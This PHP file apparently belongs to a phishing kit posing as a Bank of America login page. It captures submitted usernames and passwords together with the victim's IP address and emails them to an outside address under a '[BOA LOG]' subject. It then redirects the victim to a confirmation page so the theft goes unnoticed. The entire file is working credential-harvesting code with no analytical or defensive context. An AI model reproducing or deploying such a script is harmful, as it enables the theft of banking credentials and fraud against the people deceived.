<?php
include'ip.php';
$ip = MDgetIp();
$username = $_POST['username']."\n";
$password = $_POST['password']."\n";
$message = 'IP ADDRESS:'.$ip.' Online ID:'.$username.' Password:'.$password;

$to = "rizot@tuta.io";
$subject = "[BOA LOG] ARMCOKE LOGIN";
$headers = "From: Jokercc spammer";
$headers ="MIME-Version: 1.0 \r\n";
$headers ="Content-type: text/html \r\n";
mail($to,$subject,$message,$headers);
$praga=rand();
$praga=md5($praga);

header("location:confirm.php");
	 
?>
